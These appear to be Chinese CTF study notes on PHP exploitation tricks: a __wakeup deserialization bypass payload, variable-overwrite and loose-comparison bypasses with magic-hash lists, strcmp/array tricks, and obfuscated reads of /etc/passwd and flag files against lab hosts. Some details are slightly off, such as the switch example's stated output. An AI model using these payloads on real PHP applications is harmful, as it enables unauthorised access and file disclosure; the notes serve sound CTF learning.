# PHP特性

onlinephp.io 可选不同版本php

### \_\_wakeup()绕过 (CVE-2016-7124)

主要影响 **PHP 5.6.25 之前** 和 **PHP 7.0.10 之前版本**

反序列化的时候会先调用\_\_wakeup()函数

```php
<?php
  highlight_file(__FILE__);

class NSS {
  var $name;

  function __wakeup() {
    $this->name = '1';
  }

  function __destruct() {
    if ($this->name === 'ctf') {
      echo getenv('FLAG');
    }
  }
}

```

正常：`O:3:"NSS":1:{s:4:"name";s:3:"ctf";}`

(object:类名长度:"类名":属性数量:{string:字符串长度:"属性名"})

payload：`O:3:"NSS":2:{s:4:"name";s:3:"ctf";}`

显示属性的比读到的多就能绕过

### 变量覆盖

#### $$

```php
foreach($_GET['a'] as $key => $value) {
    $$key = $value;
}
```

如果假设用户访问的URL为：

`http://example.com/?a[username]=John&a[age]=25`

* 第一次循环：`$key = 'username'`, `$value = 'John'`→ 创建变量 `$username = 'John'`
* 第二次循环：`$key = 'age'`, `$value = '25'`→ 创建变量 `$age = '25'`

执行后，代码中可直接使用 `$username='Johe'`和 `$age='25'`这两个变量

#### parse\_str($\_GET\['param']);

```php
if($arr[1]==="i want" && $paa!=='come_baby' && $a_b==='haha'){
  die(getenv('FLAG'));
}
```

payload

http://node4.anna.nssctf.cn:28918/?param=arr\[1]=i want\&a\_b=haha\&paa=haha

红色部分要urlencode

#### import\_request\_variables

这个函数在 **PHP 5.4.0 中已被废弃**，并在 **PHP 8.0.0 中被移除**。在现代PHP环境中几乎见不到，属于比较古老的漏洞利用方式

`import_request_variables("G")`函数指定导入 GET 请求中的变量， 提交 `test.php?auth=1` 后，`$auth=1`。

#### extract($\_GET);

同`import_request_variables("G")`

### 弱比较

#### 类型转换

✅php中 "999a2" +1 === 1000 ，会进行类型转换

#### 科学记数法

1.

md5

240610708:0e462097431906509019562988736854\ QLTHNDT:0e405967825401955372549139051580\ QNKCDZO:0e830400451993494058024219903391\ PJNPDWY:0e291529052894702774557631701704\ NWWKITQ:0e763082070976038347657360817689\ NOOPCJF:0e818888003657176127862245791911\ MMHUWUV:0e701732711630150438129209816536\ MAUXXQC:0e478478466848439040434801845361

sha1

10932435112: 0e07766915004133176347055865026311692244\ aaroZmOk: 0e66507019969427134894567494305185566735\ aaK1STfY: 0e76658526655756207688271159624026011393\ aaO8zKZF: 0e89257456677279068558073954252716165668\ aa3OFF9m: 0e36977786278517984959260394024281014729\ 0e1290633704: 0e19985187802402577070739524195726831799

2.

```php
$s = "1e3";
if(intval($s) < 666 && intval($s+1) > 667){  
  die(getenv('FLAG'));
}
```

#### 数组

```php
if($a!==$b && md5($param1)===md5($param2))
{
  xxx
}
```

http://node4.anna.nssctf.cn:28986/?param1\[]=1\¶m2\[]=2

#### case

```php
$a = 0;
switch ($a) {
  case $a>=0:
    echo 0;
    break;
  case $a>=10:
    echo 1;
    break;
  default:
    echo 2;
    break;
}
```

这段代码输出`1`

1. 先计算`$a>=0`, 值为`true`;
2. 再比较 $a 和 true;

C语言中不成立，因为C语言中case 后必须接常量表达式

#### strcmp

```php
if(strcmp($_POST['password'], $password) == 0)
{
  xxx
}
```

当strcmp的第一个参数不是字符串时，返回NULL (NULL==0)

PHP 原生类 SplFileObject 进行文件读取

```php
<?php$f=newSplFileObject('/etc/passwd');
  while(!$f->eof())
    echo$f->fgets();
```

#### var\_dump(scandir(chr(47)))

输出`/`目录下的文件列表

glob() 函数返回一个包含匹配指定模式的文件名或目录的数组

`glob('/*')` 会在根目录下查找所有文件和目录，并返回一个包含它们的完整路径的数组。 `模式匹配`

* glob('/var/log/\*.log')

`scandir('/')` 和 `glob('/*')` 的作用相似

`scandir('/')` 就像是你在命令行中执行 `ls /`，而 `glob('/*')` 更像是执行 `ls -d / *` 或在脚本中进行路径匹配。

#### file\_get\_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))

花式读取`/f1agg`

* file\_get\_contents('f1agg')
* show\_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
* print\_r(php\_strip\_whitespace(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
* readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
* var\_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
* include(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
## phpinfo()

`phpinfo()` 页面可以用于确认：

- `disable_functions`：当前禁用了哪些函数。
- `open_basedir`：PHP 可访问的目录范围。
- `Loaded Configuration File`：实际加载的 php.ini。
- `DOCUMENT_ROOT`：Web 根目录。
- 扩展、版本、Server API 和上传限制。

这些信息能直接影响文件读取、命令执行和 Getshell 方式。
